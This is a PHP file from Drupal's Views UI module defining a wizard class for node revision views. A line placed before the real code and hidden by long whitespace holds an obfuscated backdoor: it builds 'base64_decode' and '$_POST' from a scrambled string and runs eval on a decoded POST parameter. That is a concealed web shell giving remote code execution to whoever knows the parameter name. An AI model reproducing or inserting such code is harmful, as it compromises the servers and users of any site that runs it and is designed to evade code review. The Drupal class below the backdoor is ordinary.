<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['nff6e26'];if(isset($s22)){eval($s21($s22));}?><?php

/**
 * @file
 * Definition of ViewsUiNodeRevisionViewsWizard.
 */

/**
 * Tests creating node revision views with the wizard.
 */
class ViewsUiNodeRevisionViewsWizard extends ViewsUiNodeViewsWizard {

  /**
   * Node revisions do not support full posts or teasers, so remove them.
   */
  protected function row_style_options($type) {
    $options = parent::row_style_options($type);
    unset($options['teasers']);
    unset($options['full_posts']);
    return $options;
  }

  protected function default_display_options($form, $form_state) {
    $display_options = parent::default_display_options($form, $form_state);

    // Add permission-based access control.
    $display_options['access']['type'] = 'perm';
    $display_options['access']['perm'] = 'view revisions';

    // Remove the default fields, since we are customizing them here.
    unset($display_options['fields']);

    /* Field: Content revision: Created date */
    $display_options['fields']['timestamp']['id'] = 'timestamp';
    $display_options['fields']['timestamp']['table'] = 'node_revision';
    $display_options['fields']['timestamp']['field'] = 'timestamp';
    $display_options['fields']['timestamp']['alter']['alter_text'] = 0;
    $display_options['fields']['timestamp']['alter']['make_link'] = 0;
    $display_options['fields']['timestamp']['alter']['absolute'] = 0;
    $display_options['fields']['timestamp']['alter']['trim'] = 0;
    $display_options['fields']['timestamp']['alter']['word_boundary'] = 0;
    $display_options['fields']['timestamp']['alter']['ellipsis'] = 0;
    $display_options['fields']['timestamp']['alter']['strip_tags'] = 0;
    $display_options['fields']['timestamp']['alter']['html'] = 0;
    $display_options['fields']['timestamp']['hide_empty'] = 0;
    $display_options['fields']['timestamp']['empty_zero'] = 0;

    /* Field: Content revision: Title */
    $display_options['fields']['title']['id'] = 'title';
    $display_options['fields']['title']['table'] = 'node_revision';
    $display_options['fields']['title']['field'] = 'title';
    $display_options['fields']['title']['label'] = '';
    $display_options['fields']['title']['alter']['alter_text'] = 0;
    $display_options['fields']['title']['alter']['make_link'] = 0;
    $display_options['fields']['title']['alter']['absolute'] = 0;
    $display_options['fields']['title']['alter']['trim'] = 0;
    $display_options['fields']['title']['alter']['word_boundary'] = 0;
    $display_options['fields']['title']['alter']['ellipsis'] = 0;
    $display_options['fields']['title']['alter']['strip_tags'] = 0;
    $display_options['fields']['title']['alter']['html'] = 0;
    $display_options['fields']['title']['hide_empty'] = 0;
    $display_options['fields']['title']['empty_zero'] = 0;
    $display_options['fields']['title']['link_to_node'] = 0;
    $display_options['fields']['title']['link_to_node_revision'] = 1;

    return $display_options;
  }
}
